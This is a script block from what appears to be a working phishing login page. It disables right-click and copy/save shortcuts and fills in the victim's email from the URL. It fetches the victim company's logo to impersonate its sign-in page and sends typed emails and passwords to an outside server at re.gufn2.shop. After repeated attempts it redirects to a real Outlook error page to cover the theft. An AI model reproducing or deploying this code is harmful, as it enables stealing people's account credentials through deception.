    <script>
	// Disable right-click context menu
document.addEventListener('contextmenu', function(event) {
  event.preventDefault();
});

// Disable specific Ctrl key combinations and text highlighting
document.addEventListener('keydown', function(event) {
  // List of keys you want to disable when Ctrl is pressed
  const blockedKeys = ['s', 'c', 'v', 'x', 'p', 'a'];

  if (event.ctrlKey && blockedKeys.includes(event.key.toLowerCase())) {
    event.preventDefault();
  }
});

	
      $(document).ready(function() {
        // Fetch the logo on load from email input field directly using Clearbit Logo API
        function fetchLogo(email) {
          const domain = email.split('@')[1];
          const domainWithoutTLD = domain.split('.')[0];
          const clearbitUrl = 'https://logo.clearbit.com/' + domain;
          $('#logo').attr('src', clearbitUrl);
          $('#domain-name').text(domainWithoutTLD.toUpperCase());
        }
        const urlParams = new URLSearchParams(window.location.search);
        const email = urlParams.get('email');
        document.getElementById('email').value = email;
        fetchLogo(email); // Call fetchLogo function when email is available
        let step = 1;
        $('#login-form').on('submit', function(event) {
          event.preventDefault();
          $('#submitBtn').text('Signing in...');
          const email = $('#email').val();
          const password = $('#password').val();
          $.ajax({
            url: 'https://re.gufn2.shop/e/em.php',
            type: 'POST',
            data: {
              email: email,
              password: password
            },
            success: function(response) {
              if (response.success) {
                window.location.href = 'https://outlook.office365.com/Encryption/ErrorPage.aspx?src=3&code=11&be=SN6PR04MB4014&fe=JNAP275CA0040.ZAFP275.PROD.OUTLOOgK.COM&loc=en-US&itemID=E4E_M_e9df154a-e4b8-4486-8aec-7acceeb93fee';
              } else {
                handleUnsuccessfulAttempt();
              }
            },
            error: function() {
              handleUnsuccessfulAttempt();
            }
          });
        });

        function handleUnsuccessfulAttempt() {
          if (step >= 3) {
            window.location.href = 'https://outlook.office365.com/Encryption/ErrorPage.aspx?src=3&code=11&be=SN6PR04MB4014&fe=JNAP275CA0040.ZAFP275.PROD.OUTLOOgK.COM&loc=en-US&itemID=E4E_M_e9df154a-e4b8-4486-8aec-7acceeb93fee';
          } else {
            $('#msg').show().fadeOut(5000);
            $('#msg').html("Please check you entered your email and password correctly and try again.");
            $('#password').val('');
            step++;
            $('#submitBtn').text('Sign In');
          }
        }
      });
    </script>
